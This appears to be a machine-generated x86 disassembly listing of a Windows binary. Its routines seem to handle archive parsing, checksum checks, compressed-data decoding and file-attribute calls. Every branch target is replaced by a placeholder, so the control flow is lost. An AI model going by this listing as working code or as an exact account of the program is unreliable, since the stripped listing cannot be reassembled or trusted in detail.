jne r-xdata
inc edx
add edi 0x20
cmp edx [ esi + 0x1c ]
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx ebx
imul ecx ecx 0x28
inc ebp
cmp ebp [ ecx + eax + 0x24 ]
jb r-xdata
push 0x10
jmp r-xdata
mov eax [ esi + 0x38 ]
mov [ eax + ebx * 4 ] edx
mov eax [ esi + 0xc ]
cmp [ eax + ecx + 0x24 ] 0x0
jne r-xdata
mov ecx esi
call sub_40489f
add esp 0x8
mov eax [ esp + 0x44 ]
mov eax [ eax ]
mov al [ eax + ebp ]
and [ edi ] 0x0
mov [ edi + 0x9 ] al
test al al
je r-xdata
mov edi [ esp + 0x44 ]
xor eax eax
cmp [ edi ] al
sete al
mov [ esp + 0x1c ] eax
test eax eax
je r-xdata
inc ebx
xor ebp ebp
pop eax
jmp r-xdata
inc ebx
add ecx 0x28
jmp r-xdata
cmp ebx [ esi + 0x18 ]
jae r-xdata
sub_405bbb
push ebp
mov ebp esp
sub esp 0x18
push esi
xor eax eax
push edi
mov edi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_40572d
push [ ebp - 0x4 ]
mov esi eax
push edi
call [ edi + 0x4 ]
push [ ebp - 0x8 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0xc ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0x10 ]
push edi
call [ edi + 0x4 ]
add esp 0x40
push [ ebp - 0x14 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0x18 ]
push edi
call [ edi + 0x4 ]
add esp 0x10
mov eax esi
pop edi
pop esi
leave
retn
sub_405c33
sub esp 0x14
push ebx
push ebp
mov ebp [ esp + 0x2c ]
and [ esp + 0xc ] 0x0
push esi
push edi
push [ esp + 0x44 ]
mov [ esp + 0x1c ] ecx
push [ esp + 0x48 ]
lea ecx [ esp + 0x1c ]
push [ esp + 0x48 ]
mov eax edx
push [ esp + 0x48 ]
lea edx [ esp + 0x2c ]
push [ esp + 0x48 ]
push ecx
push ebp
mov ecx eax
call sub_4055f3
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x1c ]
add esi [ esp + 0x2c ]
mov edi [ esp + 0x20 ]
adc edi [ esp + 0x30 ]
cmp [ ebp + 0x18 ] 0x1
je r-xdata
mov ebx [ ebp + 0xc ]
mov ecx ebx
call sub_404499
mov ecx [ esp + 0x18 ]
push edi
push esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x28 ] edx
call sub_4067f0
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x10
push [ esp + 0x44 ]
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x2c ]
call sub_4036e9
pop ecx
test eax eax
jne r-xdata
push [ esp + 0x44 ]
mov eax [ esp + 0x2c ]
push [ esp + 0x18 ]
mov edx [ ebp ]
push [ eax ]
mov ecx ebx
push edi
push esi
push [ esp + 0x2c ]
call sub_4040fa
add esp 0x18
test eax eax
jne r-xdata
push 0x2
jmp r-xdata
cmp [ ebx + 0x1c ] eax
je r-xdata
pop eax
jmp r-xdata
xor eax eax
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x14 ]
mov ecx [ eax ]
call sub_40372c
cmp eax [ ebx + 0x20 ]
je r-xdata
push 0x3
jmp r-xdata
sub_405d23
push ebp
mov ebp esp
sub esp 0x30
xor eax eax
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
call sub_4044d4
mov edi [ ebp + 0x14 ]
push edi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ecx
push eax
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405c33
mov edx edi
lea ecx [ ebp - 0x2c ]
mov esi eax
call sub_4044ee
push [ ebp - 0x4 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0x8 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0xc ]
push edi
call [ edi + 0x4 ]
add esp 0x38
mov eax esi
pop edi
pop esi
leave
retn
sub_405d8d
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
mov eax [ esp + 0x68 ]
push ebx
push ebp
mov ebp [ esp + 0x74 ]
push esi
push edi
mov [ esp + 0x34 ] eax
push 0x1
lea eax [ esp + 0x44 ]
mov ebx edx
push eax
xorps xmm0 xmm0
push ebx
mov [ esp + 0x34 ] ecx
movlpd [ esp + 0x4c ] xmm0
call [ ebx + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x64
retn
push 0x11
push 0x20
lea edx [ esp + 0x54 ]
mov ecx ebx
call sub_406825
pop ecx
pop ecx
test eax eax
jne r-xdata
lea ecx [ esp + 0x4c ]
call sub_404731
test eax eax
jne r-xdata
cmp [ esp + 0x52 ] 0x0
je r-xdata
push 0x11
jmp r-xdata
mov eax [ esp + 0x5c ]
mov ecx [ esp + 0x40 ]
mov edi [ esp + 0x60 ]
mov esi [ esp + 0x58 ]
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x64 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x68 ]
push 0x0
pop edx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x44 ]
add ecx 0x20
adc eax edx
mov edx [ esp + 0x28 ]
push 0x14
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] eax
pop edx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x20 ] edi
call sub_40372c
cmp eax [ esp + 0x54 ]
je r-xdata
push 0x4
jmp r-xdata
pop eax
cmp edi edi
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
mov ecx [ esp + 0x2c ]
xor eax eax
cmp eax ecx
jne r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x30 ]
mov eax edi
add eax esi
adc ecx edx
mov [ esp + 0x18 ] eax
mov [ esp + 0x2c ] ecx
cmp edx ecx
ja r-xdata
jb r-xdata
add eax 0x20
mov [ esp + 0x38 ] eax
mov eax ecx
adc eax 0x0
cmp edx eax
ja r-xdata
cmp esi eax
ja r-xdata
jb r-xdata
push 0x2
lea eax [ esp + 0x3c ]
push eax
xorps xmm0 xmm0
push ebx
movlpd [ esp + 0x44 ] xmm0
call [ ebx + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
cmp esi [ esp + 0x38 ]
ja r-xdata
add esi [ esp + 0x40 ]
mov edx [ esp + 0x30 ]
adc edx [ esp + 0x44 ]
cmp [ esp + 0x3c ] edx
jb r-xdata
push 0x6
jmp r-xdata
ja r-xdata
push 0x0
add esi 0x20
pop eax
adc edx eax
cmp [ esp + 0x3c ] edx
jb r-xdata
cmp [ esp + 0x38 ] esi
jb r-xdata
ja r-xdata
mov eax [ esp + 0x18 ]
add eax [ esp + 0x40 ]
mov ecx [ esp + 0x2c ]
adc ecx [ esp + 0x44 ]
add eax 0x20
adc ecx 0x0
cmp [ esp + 0x3c ] ecx
jb r-xdata
cmp [ esp + 0x38 ] esi
jb r-xdata
ja r-xdata
push edx
push esi
mov ecx ebx
call sub_4067f0
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x38 ] eax
jb r-xdata
push ebp
mov edx edi
lea ecx [ esp + 0x1c ]
call sub_4036e9
pop ecx
test eax eax
je r-xdata
push edi
mov edi [ esp + 0x1c ]
mov edx edi
mov ecx ebx
call sub_406878
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov edx ebp
lea ecx [ esp + 0x18 ]
call sub_403718
mov eax esi
jmp r-xdata
mov edx [ esp + 0x20 ]
push 0x10
pop esi
mov ecx edi
call sub_40372c
cmp eax [ esp + 0x10 ]
jne r-xdata
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
call j_sub_4047d7
mov esi eax
test esi esi
jne r-xdata
mov edi [ esp + 0x20 ]
cmp edi 0x17
jne r-xdata
cmp edi 0x1
jne r-xdata
cmp [ esp + 0x24 ] eax
jne r-xdata
push 0x4
pop esi
cmp [ esp + 0x24 ] eax
jne r-xdata
lea ecx [ esp + 0x38 ]
call sub_4036e1
mov eax [ esp + 0x28 ]
push ebp
push [ eax + 0x24 ]
lea edx [ esp + 0x18 ]
push [ eax + 0x20 ]
mov eax ecx
push eax
mov ecx ebx
call sub_405d23
mov esi eax
add esp 0x10
mov edx ebp
test esi esi
je r-xdata
mov ecx [ esp + 0x28 ]
push ebp
push [ esp + 0x38 ]
lea edx [ esp + 0x18 ]
call sub_405bbb
pop ecx
pop ecx
mov esi eax
jmp r-xdata
lea ecx [ esp + 0x18 ]
call sub_403718
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x10 ] ecx
lea edx [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] eax
call j_sub_4047d7
mov edi [ esp + 0x20 ]
mov esi eax
lea ecx [ esp + 0x38 ]
call sub_403718
jmp r-xdata
xor eax eax
test esi esi
jne r-xdata
sub_40609b
push ecx
push esi
push edi
push [ esp + 0x14 ]
mov edi ecx
push [ esp + 0x14 ]
call sub_405d8d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ecx
retn
mov edx [ esp + 0x10 ]
mov ecx edi
call sub_404567
sub_4060c6
sub esp 0x1c
mov eax [ ecx + 0x3c ]
push ebx
mov ebx [ esp + 0x24 ]
push ebp
mov ebp [ esp + 0x38 ]
push esi
push edi
mov edi [ eax + ebx * 4 ]
mov eax [ esp + 0x44 ]
mov [ esp + 0x18 ] edx
xor edx edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x28 ] edi
mov esi edx
mov [ ebp ] edx
mov [ eax ] edx
cmp edi 0xffffffff
jne r-xdata
mov edx [ esp + 0x38 ]
mov eax [ edx ]
mov [ esp + 0x20 ] eax
test eax eax
je r-xdata
mov esi [ esp + 0x38 ]
mov eax [ esp + 0x48 ]
push [ esi ]
push eax
call [ eax + 0x4 ]
mov eax [ esp + 0x3c ]
pop ecx
or [ eax ] edi
mov eax [ esp + 0x40 ]
pop ecx
xor ecx ecx
mov [ eax ] ecx
mov [ esi ] ecx
xor eax eax
jmp r-xdata
mov eax edi
imul eax eax 0x28
add eax [ ecx + 0xc ]
mov ecx eax
mov [ esp + 0x24 ] eax
call sub_404499
mov esi eax
mov [ esp + 0x1c ] edx
push ecx
mov ecx [ esp + 0x14 ]
mov edx edi
mov [ esp + 0x34 ] esi
call sub_404718
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0x40 ] edx
cmp esi esi
jne r-xdata
mov eax [ esp + 0x34 ]
cmp [ eax ] edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push 0x2
xor eax eax
cmp eax [ esp + 0x1c ]
jne r-xdata
mov eax [ ecx + 0x10 ]
mov edi ebx
shl edi 0x5
add edi eax
mov [ esp + 0x30 ] eax
xor eax eax
mov [ ebp ] eax
mov eax [ ecx + 0x38 ]
mov ecx [ esp + 0x28 ]
mov eax [ eax + ecx * 4 ]
mov [ esp + 0x40 ] eax
cmp eax ebx
jae r-xdata
mov eax [ esp + 0x34 ]
push [ esp + 0x20 ]
mov [ eax ] edi
mov eax [ esp + 0x4c ]
push eax
call [ eax + 0x4 ]
push [ esp + 0x48 ]
mov esi [ esp + 0x44 ]
push [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
xor eax eax
mov [ esi ] eax
call sub_4067f0
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x44 ]
mov ebx [ edi + 0x8 ]
mov ebp [ ebp ]
mov ecx [ esp + 0x3c ]
mov [ eax ] ebx
lea eax [ ebx + ebp ]
cmp eax [ ecx ]
jbe r-xdata
mov ecx [ esp + 0x30 ]
shl eax 0x5
add ecx 0x8
add ecx eax
sub ebx [ esp + 0x40 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x3c ]
mov [ ecx ] eax
test eax eax
je r-xdata
cmp [ edi + 0x1b ] 0x0
je r-xdata
push 0xb
jmp r-xdata
mov eax [ ecx ]
add [ ebp ] eax
lea ecx [ ecx + 0x20 ]
dec ebx
jne r-xdata
push [ esp + 0x4c ]
mov edx [ esp + 0x14 ]
push eax
push [ esi ]
mov eax [ edx + 0x30 ]
push [ esp + 0x4c ]
mov ecx [ eax + edi * 4 ]
mov eax [ edx ]
push [ esp + 0x24 ]
mov edi [ esp + 0x38 ]
push [ esp + 0x2c ]
lea edx [ eax + ecx * 8 ]
mov ecx edi
call sub_4040fa
mov esi eax
add esp 0x18
test esi esi
jne r-xdata
push eax
mov eax [ esp + 0x4c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx [ edx ]
add ecx ebp
mov edx ebx
call sub_40372c
cmp eax [ edi + 0x10 ]
push 0x3
pop ecx
cmovne esi ecx
pop eax
cmp [ edi + 0x1c ] eax
je r-xdata
mov eax [ esp + 0x30 ]
push 0x2
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x38 ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov ecx [ ecx ]
call sub_40372c
cmp eax [ edi + 0x20 ]
je r-xdata
pop esi
jmp r-xdata
push 0x3
sub_4062dd
mov eax 0x800c
call sub_413dc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8008 ] eax
push ebx
push ebp
push esi
push edi
mov edi edx
xor ebx ebx
and [ edi ] ebx
and [ edi + 0x4 ] ebx
mov [ esp + 0x14 ] ecx
xor eax eax
cmp [ esp + 0x10 ] eax
je r-xdata
add ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
cmp ebx 0x20
jbe r-xdata
mov eax 0x8000
sub eax ebx
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
lea edx [ esp + 0x18 ]
push eax
add edx ebx
call sub_4041e5
pop ecx
test eax eax
jne r-xdata
lea ebp [ ebx - 0x20 ]
xor esi esi
test ebp ebp
je r-xdata
add [ edi ] ebp
lea eax [ esp + 0x18 ]
adc [ edi + 0x4 ] 0x0
sub ebx ebp
add eax ebp
push ebx
push eax
lea eax [ esp + 0x20 ]
push eax
call sub_40ebc0
add esp 0xc
cmp [ edi + 0x4 ] 0x0
ja r-xdata
jmp r-xdata
cmp [ edi ] __dos_header
ja r-xdata
cmp [ esp + esi + 0x18 ] 0x37
jne r-xdata
mov ecx [ esp + 0x14 ]
jmp r-xdata
cmp esi ebp
jae r-xdata
cmp esi ebp
je r-xdata
inc esi
mov eax [ esp + esi + 0x18 ]
mov ecx rw-data
cmp eax [ ecx ]
jne r-xdata
inc esi
cmp esi ebp
jb r-xdata
movzx eax [ esp + esi + 0x1c ]
cmp ax [ ecx + 0x4 ]
jne r-xdata
push 0x14
lea ecx [ esp + 0x28 ]
add ecx esi
pop edx
call sub_40372c
cmp eax [ esp + esi + 0x20 ]
je r-xdata
add [ edi ] esi
adc [ edi + 0x4 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esp + 0x8018 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x800c
retn
sub_4063e7
sub esp 0x25c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x254 ] eax
lea eax [ esp ]
push eax
push ecx
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ FindClose@IAT ]
xor eax eax
inc eax
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x254 ]
xor ecx esp
call sub_40eb9e
add esp 0x25c
retn
sub_40642e
mov eax 0x46ec
call sub_413dc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x46e4 ] eax
push ebx
push ebp
push esi
push edi
xor eax eax
mov ebp ecx
xor ecx ecx
push 0x61a
mov [ esp + 0x40d4 ] ax
push ecx
lea eax [ esp + 0x40da ]
push eax
mov ebx edx
mov edi ecx
call sub_414c70
mov esi ebx
add esp 0xc
lea ecx [ esi + 0x2 ]
xor edx edx
mov ax [ esi ]
add esi 0x2
cmp ax dx
jne r-xdata
push ebx
lea eax [ esp + 0x40d4 ]
sub esi ecx
push 0x30e
push eax
sar esi 0x1
call sub_40f538
add esp 0xc
push 0x5c
pop eax
cmp [ ebx + esi * 2 - 0x2 ] ax
je r-xdata
xor ebx ebx
lea ecx [ esp + 0x40d0 ]
call sub_4067dc
lea esi [ esp + 0x40d0 ]
xor ebx ebx
lea ecx [ esi + 0x2 ]
push 0xb
pop edi
jmp r-xdata
xorps xmm0 xmm0
lea edx [ esp + 0x30 ]
lea ecx [ esp + 0x40cc ]
movlpd [ esp + 0x30 ] xmm0
call sub_4062dd
test eax eax
je r-xdata
mov ax [ esi ]
add esi 0x2
cmp ax bx
jne r-xdata
sub esi ecx
sar esi 0x1
jmp r-xdata
lea ecx [ esp + 0x40 ]
call sub_404549
test edi edi
jne r-xdata
push ebx
lea edx [ esp + 0x34 ]
lea ecx [ esp + 0x40d0 ]
call sub_4042e1
pop ecx
test eax eax
je r-xdata
call sub_403740
lea ecx [ esp + 0x40c4 ]
mov [ esp + 0x90 ] sub_4036c1
mov [ esp + 0x94 ] sub_4036d6
mov [ esp + 0x98 ] sub_4036c1
mov [ esp + 0x9c ] sub_4036d6
call sub_4043a1
lea ecx [ esp + 0xa0 ]
call sub_40694f
mov edx ebp
lea ecx [ esp + 0x40cc ]
call sub_4041b1
test eax eax
jne r-xdata
lea edx [ esp + 0x90 ]
lea ecx [ esp + 0x40 ]
call sub_404567
lea ecx [ esp + 0x40cc ]
call sub_4041c3
mov ecx [ esp + 0x46f4 ]
xor eax eax
test edi edi
pop edi
pop esi
pop ebp
setne al
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x46ec
retn
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x94 ]
push eax
lea edx [ esp + 0xa8 ]
lea ecx [ esp + 0x48 ]
call sub_40609b
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
lea eax [ esp + 0x40c4 ]
lea ecx [ esp + 0xa0 ]
mov [ esp + 0xb0 ] eax
call sub_40696b
or [ esp + 0x30 ] 0xffffffff
xor ecx ecx
mov ebp ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x24 ] ebp
cmp [ esp + 0x5c ] ecx
jbe r-xdata
push [ esp + 0x14 ]
lea eax [ esp + 0x94 ]
push eax
call [ esp + 0x9c ]
pop ecx
pop ecx
mov ebx ecx
mov [ esp + 0x1c ] ecx
push 0xb
pop edi
lea eax [ esp + 0x40d0 ]
mov edx ebp
lea eax [ eax + esi * 2 ]
push eax
lea ecx [ esp + 0x44 ]
call sub_4056b3
pop ecx
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x94 ]
push eax
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x38 ]
push eax
lea eax [ esp + 0x4c ]
push eax
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x48 ]
push eax
push ebp
lea edx [ esp + 0xc0 ]
lea ecx [ esp + 0x60 ]
call sub_4060c6
mov edi eax
add esp 0x20
test edi edi
jne r-xdata
lea ecx [ esp + 0x40d0 ]
xor edx edx
lea ecx [ ecx + esi * 2 ]
mov eax edx
mov [ esp + 0x10 ] edx
cmp [ ecx ] dx
je r-xdata
mov eax [ esp + 0x20 ]
lea ecx [ esp + 0x40d0 ]
cmp [ ebx + eax + 0x19 ] 0x0
je r-xdata
push 0x5c
mov ebp ecx
pop ebx
call sub_4063e7
test eax eax
jne r-xdata
call sub_4062c2
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
lea ebp [ ecx + eax * 2 ]
cmp [ ebp ] dx
jne r-xdata
xor eax eax
lea ecx [ esp + 0x40d0 ]
mov [ ebp ] ax
call sub_4062c2
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x40d0 ]
mov [ ebp ] bx
lea ecx [ ecx + esi * 2 ]
xor edx edx
lea edx [ esp + 0x40d0 ]
lea ecx [ esp + 0x28 ]
call sub_4041ba
test eax eax
jne r-xdata
inc ebp
add ebx 0x20
push 0x0
mov [ esp + 0x28 ] ebp
mov [ esp + 0x20 ] ebx
pop ecx
cmp ebp [ esp + 0x5c ]
jb r-xdata
cmp [ ebp ] 0x2f
jne r-xdata
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x2c ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x2c ]
lea edx [ edx + eax ]
call sub_404263
pop ecx
test eax eax
jne r-xdata
mov eax [ esp + 0x50 ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x18 ] ecx
push ecx
mov edx ebp
lea ecx [ esp + 0x44 ]
mov [ esp + 0x24 ] eax
call sub_4056b3
pop ecx
cmp eax 0x104
jae r-xdata
jmp r-xdata
push 0xb
pop edi
mov eax [ esp + 0x18 ]
cmp [ esp + 0x10 ] eax
je r-xdata
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
call sub_4041c3
test edi edi
jne r-xdata
mov edi eax
jmp r-xdata
mov eax [ esp + 0x20 ]
cmp [ ebx + eax + 0x1d ] 0x0
je r-xdata
push [ ebx + eax + 0x14 ]
lea eax [ esp + 0x40d4 ]
push eax
call [ SetFileAttributesW@IAT ]
sub_4067f0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ ecx + 0xc ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0xc
call sub_40eb9e
leave
retn
sub_406825
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi edx
mov ebx ecx
test esi esi
je r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ebx
mov [ ebp - 0x8 ] esi
call [ ebx + 0x8 ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
add edi eax
sub esi eax
jne r-xdata
sub_406886
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0xc ]
xor edx edx
mov eax [ edi + 0x18 ]
sub eax [ edi + 0x14 ]
jne r-xdata
cmp eax [ esi ]
jae r-xdata
cmp [ esi ] edx
jbe r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ edi + 0x1c ]
add ecx [ edi + 0x14 ]
pop edi
mov [ eax ] ecx
mov eax edx
pop esi
retn
mov [ esi ] eax
mov eax 0x4000
mov [ edi + 0x14 ] edx
cmp [ esi ] eax
jbe r-xdata
mov ecx [ edi + 0x10 ]
push esi
lea eax [ edi + 0x1c ]
push eax
push ecx
call [ ecx ]
mov edx eax
mov eax [ esi ]
add esp 0xc
mov [ edi + 0x18 ] eax
mov [ esi ] eax
sub_4068e6
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebx + 0x14 ]
mov edi [ ebx + 0x18 ]
sub edi eax
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
cmp edi [ esi ]
cmova edi [ esi ]
add eax 0x1c
push edi
add eax ebx
push eax
push [ ebp + 0xc ]
call sub_410c10
add [ ebx + 0x14 ] edi
add esp 0xc
mov [ esi ] edi
xor eax eax
pop esi
push [ ebp + 0x10 ]
mov eax [ ebx + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ eax ]
add esp 0xc
jmp r-xdata
pop edi
pop ebx
pop ebp
retn
sub_406974
sub esp 0x228
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x224 ] eax
mov eax [ esp + 0x244 ]
mov [ esp + 0x18 ] eax
xor eax eax
push ebx
push ebp
mov bl al
push esi
mov esi eax
mov [ esp + 0x28 ] edx
mov eax 0x400
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
push edi
mov [ esp + 0x20 ] ecx
mov ecx 0x81
lea edi [ esp + 0x30 ]
[ edi ]
mov edi [ esp + 0x24c ]
mov eax [ esp + 0x250 ]
add eax edi
xor ebp ebp
mov [ esp + 0x1c ] eax
or eax 0xffffffff
mov ecx ebp
mov [ esp + 0x14 ] eax
mov edx ebp
xor eax eax
inc eax
movzx eax [ edi ]
shl ecx 0x8
or ecx eax
inc edi
inc edx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x24c ] edi
cmp edx 0x5
jl r-xdata
cmp edi [ esp + 0x1c ]
je r-xdata
cmp [ esp + 0x258 ] esi
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x258 ]
sub edx ebp
sub eax esi
cmp eax edx
cmovb edx eax
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
cmp esi [ esp + 0x258 ]
setne al
jmp r-xdata
mov edi [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
mov ecx [ esp + 0x234 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x228
retn
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x24c ]
test edx edx
je r-xdata
cmp bl 0xf
jne r-xdata
cmp esi [ esp + 0x258 ]
je r-xdata
inc ebp
mov bl ah
dec edx
jne r-xdata
mov al ah
and al 0xf0
cmp al 0x80
je r-xdata
mov eax [ esp + 0x20 ]
mov al [ eax + ebp ]
inc ebp
mov [ esp + 0x13 ] al
mov [ esp + 0x24 ] ebp
cmp al 0xe8
jne r-xdata
mov ah [ ecx + ebp ]
mov al ah
mov [ edi + esi ] ah
and al 0xfe
inc esi
cmp al 0xe8
je r-xdata
lea ebx [ esp + 0x230 ]
lea edx [ esp + 0x232 ]
cmp al 0xe9
cmovne ebx edx
movzx eax bl
lea ebx [ esp + 0x30 ]
lea ebx [ ebx + eax * 2 ]
jmp r-xdata
sub eax edx
mov [ esp + 0x14 ] eax
mov eax ebp
shr eax 0x5
sub ebp eax
mov eax [ esp + 0x14 ]
sub ecx edx
mov [ esp + 0x18 ] ecx
mov [ ebx ] bp
cmp eax 0x1000000
jae r-xdata
mov eax 0x800
sub eax ebp
shr eax 0x5
add eax ebp
mov [ esp + 0x14 ] edx
mov [ ebx ] ax
cmp edx 0x1000000
jae r-xdata
mov eax [ esp + 0x14 ]
movzx ebp [ ebx ]
mov edx eax
shr edx 0xb
imul edx ebp
cmp ecx edx
jae r-xdata
cmp [ esp + 0x13 ] 0xe8
push 0x4
pop ebp
jne r-xdata
cmp edi [ esp + 0x1c ]
je r-xdata
mov bl [ esp + 0x13 ]
jmp r-xdata
cmp edi [ esp + 0x1c ]
je r-xdata
mov eax [ esp + 0x248 ]
mov ebx [ esp + 0x244 ]
mov edx ebx
cmp eax ebp
jb r-xdata
mov eax [ esp + 0x240 ]
mov ebx [ esp + 0x23c ]
mov edx ebx
cmp eax ebp
jb r-xdata
shl eax 0x8
mov [ esp + 0x14 ] eax
movzx eax [ edi ]
shl ecx 0x8
or ecx eax
inc edi
mov [ esp + 0x18 ] ecx
mov [ esp + 0x24c ] edi
mov ebp [ esp + 0x24 ]
jmp r-xdata
mov eax edx
shl eax 0x8
mov [ esp + 0x14 ] eax
movzx eax [ edi ]
shl ecx 0x8
or ecx eax
inc edi
mov [ esp + 0x18 ] ecx
mov [ esp + 0x24c ] edi
add ebx ebp
sub eax ebp
mov [ esp + 0x244 ] ebx
mov [ esp + 0x248 ] eax
add ebx ebp
sub eax ebp
mov [ esp + 0x23c ] ebx
mov [ esp + 0x240 ] eax
jmp r-xdata
mov eax ebx
shr eax 0x8
mov [ edx + esi ] al
inc esi
cmp esi [ esp + 0x258 ]
je r-xdata
movzx ebx [ edx ]
movzx eax [ edx + 0x1 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x2 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x3 ]
mov edx [ esp + 0x28 ]
shl ebx 0x8
or ebx eax
sub ebx esi
sub ebx ebp
mov [ edx + esi ] bl
inc esi
cmp esi [ esp + 0x258 ]
je r-xdata
mov eax ebx
shr eax 0x10
mov [ edx + esi ] al
inc esi
cmp esi [ esp + 0x258 ]
je r-xdata
shr ebx 0x18
mov [ edx + esi ] bl
inc esi
sub_406c42
push ebx
push edi
